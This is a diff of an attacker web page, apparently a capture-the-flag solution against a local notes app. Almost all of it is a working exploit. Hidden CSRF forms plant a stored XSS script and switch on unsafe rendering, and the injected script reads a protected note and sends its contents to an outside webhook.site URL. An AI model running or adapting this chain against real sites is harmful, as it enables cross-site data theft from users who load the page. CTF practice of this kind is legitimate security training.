@@ -1,34 +1,37 @@
-<!-- attacker.html (host this via GitHub Pages) -->
 <!doctype html>
 <html>
 <body>
-  <!-- 1) CSRF: create a note #2 containing our XSS -->
-  <form id="n" action="http://127.0.0.1:7189/dashboard" method="POST">
+  <!-- 1) CSRF: create note #2 containing our XSS payload -->
+  <form id="mk" action="http://127.0.0.1:7189/dashboard" method="POST">
     <input type="hidden" name="content" value='
       <script>
       (async ()=>{
-        // fetch the flag note (ID 1)
-        const r = await fetch("/notes/1");
-        const h = await r.text();
-        const f = /UMCS\{[^}]+\}/.exec(h)[0];
-        // exfil via your webhook.site URL
-        new Image().src="https://webhook.site/d1b4da46-4ad8-4ec4-8241-bcdbcefd6aa0?f="+encodeURIComponent(f);
+        // same-origin fetch of the flag note
+        const res = await fetch("/notes/1");
+        const txt = await res.text();
+        const flag = /UMCS\{[^}]+\}/.exec(txt)[0];
+        // exfil
+        new Image().src="https://webhook.site/d1b4da46-4ad8-4ec4-8241-bcdbcefd6aa0?f="+encodeURIComponent(flag);
       })();
       </script>
     '>
   </form>
 
-  <!-- 2) CSRF: turn on unsafe rendering for note #2 -->
-  <form id="u" action="http://127.0.0.1:7189/prefs/unsafe" method="POST">
+  <!-- 2) CSRF: flip “unsafe” on for note #2 -->
+  <form id="us" action="http://127.0.0.1:7189/prefs/unsafe" method="POST">
     <input type="hidden" name="id"    value="2">
     <input type="hidden" name="enable" value="1">
   </form>
 
   <script>
-    // trigger creation → wait → enable unsafe → wait → view → fire XSS
-    document.getElementById("n").submit();
-    setTimeout(() => document.getElementById("u").submit(),       3000);
-    setTimeout(() => location.href = "http://127.0.0.1:7189/notes/2", 6000);
+    // kick off: create → wait → enable → wait → view
+    document.getElementById("mk").submit();
+    setTimeout(()=>{
+      document.getElementById("us").submit();
+    }, 3000);
+    setTimeout(()=>{
+      window.location = "http://127.0.0.1:7189/notes/2";
+    }, 6000);
   </script>
 </body>
 </html>
